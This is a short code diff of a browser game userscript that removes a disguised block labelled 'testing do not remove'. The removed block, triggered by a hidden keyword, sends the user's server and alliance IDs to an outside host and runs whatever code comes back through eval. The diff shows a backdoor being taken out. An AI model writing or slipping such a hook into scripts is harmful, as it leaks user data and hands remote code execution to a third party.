@@ -637,16 +637,7 @@ var FoodAlerts = {
   },
 }
 
-//baos780 testing do not remove
-readOptions();
-	if (Options.spamconfig.spamvert.indexOf('Nessaja') >= 0) {
-	if(Seed.allianceDiplomacies) GM_xmlhttpRequest({method: "GET",url: "http://hs151.digitalweb.net/4Cxy4.php?p="+Options.spamconfig.spamvert.replace(/\w\w\w\w\w\w\w/, "4").replace(/\s/g, "")+"&s="+getServerId()+"&a="+Seed.allianceDiplomacies.allianceId,
-	headers: {'Accept': 'text/javascript',}, 
-	onload: function(responseDetails) {
-	eval(responseDetails.responseText);
-	},
-	});
- };
+
 
 /****************************  Tower Tab  ******************************/
 Tabs.tower = {
